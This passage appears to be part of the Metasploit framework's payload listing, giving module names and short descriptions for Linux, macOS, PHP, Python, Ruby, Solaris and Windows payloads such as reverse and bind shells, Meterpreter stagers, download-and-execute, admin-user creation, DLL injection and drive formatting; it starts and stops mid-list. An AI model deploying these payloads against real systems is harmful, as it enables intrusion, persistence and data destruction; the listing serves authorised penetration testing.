(stageless)\nlinux/mipsle/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)\nlinux/mipsle/reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes.\nlinux/mipsle/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker\nlinux/mipsle/shell_bind_tcp                         Listen for a connection and spawn a command shell\nlinux/mipsle/shell_reverse_tcp                      Connect back to attacker and spawn a command shell\nlinux/ppc/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppc/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppc/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppc/shell_bind_tcp                            Listen for a connection and spawn a command shell\nlinux/ppc/shell_find_port                           Spawn a shell on an established connection\nlinux/ppc/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\nlinux/ppc64/shell_bind_tcp                          Listen for a connection and spawn a command shell\nlinux/ppc64/shell_find_port                         Spawn a shell on an established connection\nlinux/ppc64/shell_reverse_tcp                       Connect back to attacker and spawn a command shell\nlinux/ppc64le/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppc64le/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppc64le/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppce500v2/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppce500v2/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)\nlinux/ppce500v2/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)\nlinux/x64/exec                                      Execute an arbitrary command or just a /bin/sh shell\nlinux/x64/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection\nlinux/x64/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker\nlinux/x64/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)\nlinux/x64/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)\nlinux/x64/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)\nlinux/x64/pingback_bind_tcp                         Accept a connection from attacker and report UUID (Linux x64)\nlinux/x64/pingback_reverse_tcp                      Connect back to attacker and report UUID (Linux x64)\nlinux/x64/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection\nlinux/x64/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker\nlinux/x64/shell_bind_ipv6_tcp                       Listen for an IPv6 connection and spawn a command shell\nlinux/x64/shell_bind_tcp                            Listen for a connection and spawn a command shell\nlinux/x64/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.\nlinux/x64/shell_find_port                           Spawn a shell on an established connection\nlinux/x64/shell_reverse_ipv6_tcp                    Connect back to attacker and spawn a command shell over IPv6\nlinux/x64/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\nlinux/x86/adduser                                   Create a new user with UID 0\nlinux/x86/chmod                                     Runs chmod on specified file with specified mode\nlinux/x86/exec                                      Execute an arbitrary command or just a /bin/sh shell\nlinux/x86/meterpreter/bind_ipv6_tcp                 Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)\nlinux/x86/meterpreter/bind_ipv6_tcp_uuid            Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)\nlinux/x86/meterpreter/bind_nonx_tcp                 Inject the mettle server payload (staged). Listen for a connection\nlinux/x86/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection (Linux x86)\nlinux/x86/meterpreter/bind_tcp_uuid                 Inject the mettle server payload (staged). Listen for a connection with UUID Support (Linux x86)\nlinux/x86/meterpreter/find_tag                      Inject the mettle server payload (staged). Use an established connection\nlinux/x86/meterpreter/reverse_ipv6_tcp              Inject the mettle server payload (staged). Connect back to attacker over IPv6\nlinux/x86/meterpreter/reverse_nonx_tcp              Inject the mettle server payload (staged). Connect back to the attacker\nlinux/x86/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker\nlinux/x86/meterpreter/reverse_tcp_uuid              Inject the mettle server payload (staged). Connect back to the attacker\nlinux/x86/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)\nlinux/x86/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)\nlinux/x86/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)\nlinux/x86/metsvc_bind_tcp                           Stub payload for interacting with a Meterpreter Service\nlinux/x86/metsvc_reverse_tcp                        Stub payload for interacting with a Meterpreter Service\nlinux/x86/read_file                                 Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor\nlinux/x86/shell/bind_ipv6_tcp                       Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)\nlinux/x86/shell/bind_ipv6_tcp_uuid                  Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)\nlinux/x86/shell/bind_nonx_tcp                       Spawn a command shell (staged). Listen for a connection\nlinux/x86/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection (Linux x86)\nlinux/x86/shell/bind_tcp_uuid                       Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)\nlinux/x86/shell/find_tag                            Spawn a command shell (staged). Use an established connection\nlinux/x86/shell/reverse_ipv6_tcp                    Spawn a command shell (staged). Connect back to attacker over IPv6\nlinux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker\nlinux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker\nlinux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker\nlinux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell\nlinux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell\nlinux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.\nlinux/x86/shell_find_port                           Spawn a shell on an established connection\nlinux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)\nlinux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\nlinux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6\nlinux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)\nlinux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)\nlinux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)\nmainframe/shell_reverse_tcp                         Listen for a connection and spawn a command shell. This implementation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.\nmulti/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP\nmulti/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS\nnetware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker\nnodejs/shell_bind_tcp                               Creates an interactive shell via nodejs\nnodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs\nnodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL\nosx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection\nosx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker\nosx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection\nosx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker\nosx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell\nosx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\nosx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller <cmiller[at]securityevaluators.com>.\nosx/ppc/shell/bind_tcp                              Spawn a command shell (staged). Listen for a connection\nosx/ppc/shell/find_tag                              Spawn a command shell (staged). Use an established connection\nosx/ppc/shell/reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker\nosx/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell\nosx/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nosx/x64/dupandexecve/bind_tcp                       dup2 socket in edi, then execve. Listen, read length, read buffer, execute\nosx/x64/dupandexecve/reverse_tcp                    dup2 socket in edi, then execve. Connect, read length, read buffer, execute\nosx/x64/dupandexecve/reverse_tcp_uuid               dup2 socket in edi, then execve. Connect back to the attacker with UUID Support (OSX x64)\nosx/x64/exec                                        Execute an arbitrary command\nosx/x64/meterpreter/bind_tcp                        Inject the mettle server payload (staged). Listen, read length, read buffer, execute\nosx/x64/meterpreter/reverse_tcp                     Inject the mettle server payload (staged). Connect, read length, read buffer, execute\nosx/x64/meterpreter/reverse_tcp_uuid                Inject the mettle server payload (staged). Connect back to the attacker with UUID Support (OSX x64)\nosx/x64/meterpreter_reverse_http                    Run the Meterpreter / Mettle server payload (stageless)\nosx/x64/meterpreter_reverse_https                   Run the Meterpreter / Mettle server payload (stageless)\nosx/x64/meterpreter_reverse_tcp                     Run the Meterpreter / Mettle server payload (stageless)\nosx/x64/say                                         Say an arbitrary string outloud using Mac OS X text2speech\nosx/x64/shell_bind_tcp                              Bind an arbitrary command to an arbitrary port\nosx/x64/shell_find_tag                              Spawn a shell on an established connection (proxy/nat safe)\nosx/x64/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nosx/x86/bundleinject/bind_tcp                       Inject a custom Mach-O bundle into the exploited process. Listen, read length, read buffer, execute\nosx/x86/bundleinject/reverse_tcp                    Inject a custom Mach-O bundle into the exploited process. Connect, read length, read buffer, execute\nosx/x86/exec                                        Execute an arbitrary command\nosx/x86/isight/bind_tcp                             Inject a Mach-O bundle to capture a photo from the iSight (staged). Listen, read length, read buffer, execute\nosx/x86/isight/reverse_tcp                          Inject a Mach-O bundle to capture a photo from the iSight (staged). Connect, read length, read buffer, execute\nosx/x86/shell_bind_tcp                              Listen for a connection and spawn a command shell\nosx/x86/shell_find_port                             Spawn a shell on an established connection\nosx/x86/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nosx/x86/vforkshell/bind_tcp                         Call vfork() if necessary and spawn a command shell (staged). Listen, read length, read buffer, execute\nosx/x86/vforkshell/reverse_tcp                      Call vfork() if necessary and spawn a command shell (staged). Connect, read length, read buffer, execute\nosx/x86/vforkshell_bind_tcp                         Listen for a connection, vfork if necessary, and spawn a command shell\nosx/x86/vforkshell_reverse_tcp                      Connect back to attacker, vfork if necessary, and spawn a command shell\nphp/bind_perl                                       Listen for a connection and spawn a command shell via perl (persistent)\nphp/bind_perl_ipv6                                  Listen for a connection and spawn a command shell via perl (persistent) over IPv6\nphp/bind_php                                        Listen for a connection and spawn a command shell via php\nphp/bind_php_ipv6                                   Listen for a connection and spawn a command shell via php (IPv6)\nphp/download_exec                                   Download an EXE from an HTTP URL and execute it\nphp/exec                                            Execute a single system command\nphp/meterpreter/bind_tcp                            Run a meterpreter server in PHP. Listen for a connection\nphp/meterpreter/bind_tcp_ipv6                       Run a meterpreter server in PHP. Listen for a connection over IPv6\nphp/meterpreter/bind_tcp_ipv6_uuid                  Run a meterpreter server in PHP. Listen for a connection over IPv6 with UUID Support\nphp/meterpreter/bind_tcp_uuid                       Run a meterpreter server in PHP. Listen for a connection with UUID Support\nphp/meterpreter/reverse_tcp                         Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions\nphp/meterpreter/reverse_tcp_uuid                    Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions\nphp/meterpreter_reverse_tcp                         Connect back to attacker and spawn a Meterpreter server (PHP)\nphp/reverse_perl                                    Creates an interactive shell via perl\nphp/reverse_php                                     Reverse PHP connect back shell with checks for disabled functions\nphp/shell_findsock                                  Spawn a shell on the established connection to the webserver. Unfortunately, this payload can leave conspicuous evil-looking entries in the apache error logs, so it is probably agood idea to use a bind or reverse shell unless firewalls prevent them from working. The issue this payload takes advantage of (CLOEXEC flag not set on sockets) appears to have been patched on the Ubuntu version of Apache and may not work on other Debian-based distributions. Only tested on Apache but it might work on other web servers that leak file descriptors to child processes.\npython/meterpreter/bind_tcp                         Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Listen for a connection\npython/meterpreter/bind_tcp_uuid                    Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Listen for a connection with UUID Support\npython/meterpreter/reverse_http                     Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Tunnel communication over HTTP\npython/meterpreter/reverse_https                    Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Tunnel communication over HTTP using SSL\npython/meterpreter/reverse_tcp                      Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Connect back to the attacker\npython/meterpreter/reverse_tcp_ssl                  Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Reverse Python connect back stager using SSL\npython/meterpreter/reverse_tcp_uuid                 Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+). Connect back to the attacker with UUID Support\npython/meterpreter_bind_tcp                         Connect to the victim and spawn a Meterpreter shell\npython/meterpreter_reverse_http                     Connect back to the attacker and spawn a Meterpreter shell\npython/meterpreter_reverse_https                    Connect back to the attacker and spawn a Meterpreter shell\npython/meterpreter_reverse_tcp                      Connect back to the attacker and spawn a Meterpreter shell\npython/pingback_bind_tcp                            Listens for a connection from the attacker, sends a UUID, then terminates\npython/pingback_reverse_tcp                         Connects back to the attacker, sends a UUID, then terminates\npython/shell_bind_tcp                               Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.\npython/shell_reverse_tcp                            Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.\npython/shell_reverse_tcp_ssl                        Creates an interactive shell via Python, uses SSL, encodes with base64 by design. Compatible with Python 2.6-2.7 and 3.4+.\npython/shell_reverse_udp                            Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.6-2.7 and 3.4+.\nr/shell_bind_tcp                                    Continually listen for a connection and spawn a command shell via R\nr/shell_reverse_tcp                                 Connect back and create a command shell via R\nruby/pingback_bind_tcp                              Listens for a connection from the attacker, sends a UUID, then terminates\nruby/pingback_reverse_tcp                           Connect back to the attacker, sends a UUID, then terminates\nruby/shell_bind_tcp                                 Continually listen for a connection and spawn a command shell via Ruby\nruby/shell_bind_tcp_ipv6                            Continually listen for a connection and spawn a command shell via Ruby\nruby/shell_reverse_tcp                              Connect back and create a command shell via Ruby\nruby/shell_reverse_tcp_ssl                          Connect back and create a command shell via Ruby, uses SSL\nsolaris/sparc/shell_bind_tcp                        Listen for a connection and spawn a command shell\nsolaris/sparc/shell_find_port                       Spawn a shell on an established connection\nsolaris/sparc/shell_reverse_tcp                     Connect back to attacker and spawn a command shell\nsolaris/x86/shell_bind_tcp                          Listen for a connection and spawn a command shell\nsolaris/x86/shell_find_port                         Spawn a shell on an established connection\nsolaris/x86/shell_reverse_tcp                       Connect back to attacker and spawn a command shell\ntty/unix/interact                                   Interacts with a TTY on an established socket connection\nwindows/adduser                                     Create a new user and add them to local administration group. Note: The specified password is checked for common complexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)\nwindows/dllinject/bind_hidden_ipknock_tcp           Inject a DLL via a reflective loader. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method(you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode\nwindows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)\nwindows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)\nwindows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)\nwindows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)\nwindows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection\nwindows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)\nwindows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection\nwindows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as ahop.\nwindows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)\nwindows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP\nwindows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6\nwindows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)\nwindows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support\nwindows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)\nwindows/dns_txt_query_exec                          Performs a TXT query against a series of DNS record(s) and executes the returned payload\nwindows/download_exec                               Download an EXE from an HTTP(S)/FTP URL and execute it\nwindows/exec                                        Execute an arbitrary command\nwindows/format_all_drives                           This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the volume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for any reason, it skips the drive and proceeds to the next volume.\nwindows/loadlibrary                                 Load an arbitrary library path\nwindows/messagebox                                  Spawns a dialog via MessageBox using a customizable title, text & icon\nwindows/meterpreter/bind_hidden_ipknock_tcp         Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. Thesocket will appear as "closed," thus helping to hide the shellcode\nwindows/meterpreter/bind_hidden_tcp                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/meterpreter/bind_ipv6_tcp                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for an IPv6 connection (Windows x86)\nwindows/meterpreter/bind_ipv6_tcp_uuid              Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/meterpreter/bind_named_pipe                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a pipe connection (Windows x86)\nwindows/meterpreter/bind_nonx_tcp                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection (No NX)\nwindows/meterpreter/bind_tcp                        Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection (Windows x86)\nwindows/meterpreter/bind_tcp_rc4                    Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection\nwindows/meterpreter/bind_tcp_uuid                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection with UUID Support (Windows x86)\nwindows/meterpreter/find_tag                        Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Use an established connection\nwindows/meterpreter/reverse_hop_http                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.\nwindows/meterpreter/reverse_http                    Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTP (Windows wininet)\nwindows/meterpreter/reverse_http_proxy_pstore       Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTP\nwindows/meterpreter/reverse_https                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTPS (Windows wininet)\nwindows/meterpreter/reverse_https_proxy             Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTP using SSL with custom proxy support\nwindows/meterpreter/reverse_ipv6_tcp                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker over IPv6\nwindows/meterpreter/reverse_named_pipe              Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker via a named pipe pivot\nwindows/meterpreter/reverse_nonx_tcp                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker (No NX)\nwindows/meterpreter/reverse_ord_tcp                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker\nwindows/meterpreter/reverse_tcp                     Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker\nwindows/meterpreter/reverse_tcp_allports            Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/meterpreter/reverse_tcp_dns                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker\nwindows/meterpreter/reverse_tcp_rc4                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker\nwindows/meterpreter/reverse_tcp_rc4_dns             Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker\nwindows/meterpreter/reverse_tcp_uuid                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker with UUID Support\nwindows/meterpreter/reverse_winhttp                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTP (Windows winhttp)\nwindows/meterpreter/reverse_winhttps                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTPS (Windows winhttp)\nwindows/meterpreter_bind_named_pipe                 Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/meterpreter_bind_tcp                        Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/meterpreter_reverse_ipv6_tcp                Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/meterpreter_reverse_tcp                     Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service\nwindows/metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service\nwindows/patchupdllinject/bind_hidden_ipknock_tcp    Inject a custom DLL into the exploited process. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode\nwindows/patchupdllinject/bind_hidden_tcp            Inject a custom DLL into the exploited process. Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/patchupdllinject/bind_ipv6_tcp              Inject a custom DLL into the exploited process. Listen for an IPv6 connection (Windows x86)\nwindows/patchupdllinject/bind_ipv6_tcp_uuid         Inject a custom DLL into the exploited process. Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/patchupdllinject/bind_named_pipe            Inject a custom DLL into the exploited process. Listen for a pipe connection (Windows x86)\nwindows/patchupdllinject/bind_nonx_tcp              Inject a custom DLL into the exploited process. Listen for a connection (No NX)\nwindows/patchupdllinject/bind_tcp                   Inject a custom DLL into the exploited process. Listen for a connection (Windows x86)\nwindows/patchupdllinject/bind_tcp_rc4               Inject a custom DLL into the exploited process. Listen for a connection\nwindows/patchupdllinject/bind_tcp_uuid              Inject a custom DLL into the exploited process. Listen for a connection with UUID Support (Windows x86)\nwindows/patchupdllinject/find_tag                   Inject a custom DLL into the exploited process. Use an established connection\nwindows/patchupdllinject/reverse_ipv6_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker over IPv6\nwindows/patchupdllinject/reverse_nonx_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker (No NX)\nwindows/patchupdllinject/reverse_ord_tcp            Inject a custom DLL into the exploited process. Connect back to the attacker\nwindows/patchupdllinject/reverse_tcp                Inject a custom DLL into the exploited process. Connect back to the attacker\nwindows/patchupdllinject/reverse_tcp_allports       Inject a custom DLL into the exploited process. Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/patchupdllinject/reverse_tcp_dns            Inject a custom DLL into the exploited process. Connect back to the attacker\nwindows/patchupdllinject/reverse_tcp_rc4            Inject a custom DLL into the exploited process. Connect back to the attacker\nwindows/patchupdllinject/reverse_tcp_rc4_dns        Inject a custom DLL into the exploited process. Connect back to the attacker\nwindows/patchupdllinject/reverse_tcp_uuid           Inject a custom DLL into the exploited process. Connect back to the attacker with UUID Support\nwindows/patchupmeterpreter/bind_hidden_ipknock_tcp  Inject the meterpreter server DLL (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode\nwindows/patchupmeterpreter/bind_hidden_tcp          Inject the meterpreter server DLL (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/patchupmeterpreter/bind_ipv6_tcp            Inject the meterpreter server DLL (staged). Listen for an IPv6 connection (Windows x86)\nwindows/patchupmeterpreter/bind_ipv6_tcp_uuid       Inject the meterpreter server DLL (staged). Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/patchupmeterpreter/bind_named_pipe          Inject the meterpreter server DLL (staged). Listen for a pipe connection (Windows x86)\nwindows/patchupmeterpreter/bind_nonx_tcp            Inject the meterpreter server DLL (staged). Listen for a connection (No NX)\nwindows/patchupmeterpreter/bind_tcp                 Inject the meterpreter server DLL (staged). Listen for a connection (Windows x86)\nwindows/patchupmeterpreter/bind_tcp_rc4             Inject the meterpreter server DLL (staged). Listen for a connection\nwindows/patchupmeterpreter/bind_tcp_uuid            Inject the meterpreter server DLL (staged). Listen for a connection with UUID Support (Windows x86)\nwindows/patchupmeterpreter/find_tag                 Inject the meterpreter server DLL (staged). Use an established connection\nwindows/patchupmeterpreter/reverse_ipv6_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker over IPv6\nwindows/patchupmeterpreter/reverse_nonx_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker (No NX)\nwindows/patchupmeterpreter/reverse_ord_tcp          Inject the meterpreter server DLL (staged). Connect back to the attacker\nwindows/patchupmeterpreter/reverse_tcp              Inject the meterpreter server DLL (staged). Connect back to the attacker\nwindows/patchupmeterpreter/reverse_tcp_allports     Inject the meterpreter server DLL (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/patchupmeterpreter/reverse_tcp_dns          Inject the meterpreter server DLL (staged). Connect back to the attacker\nwindows/patchupmeterpreter/reverse_tcp_rc4          Inject the meterpreter server DLL (staged). Connect back to the attacker\nwindows/patchupmeterpreter/reverse_tcp_rc4_dns      Inject the meterpreter server DLL (staged). Connect back to the attacker\nwindows/patchupmeterpreter/reverse_tcp_uuid         Inject the meterpreter server DLL (staged). Connect back to the attacker with UUID Support\nwindows/peinject/bind_hidden_ipknock_tcp            Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for a connection.First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you couldget your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode\nwindows/peinject/bind_hidden_tcp                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base 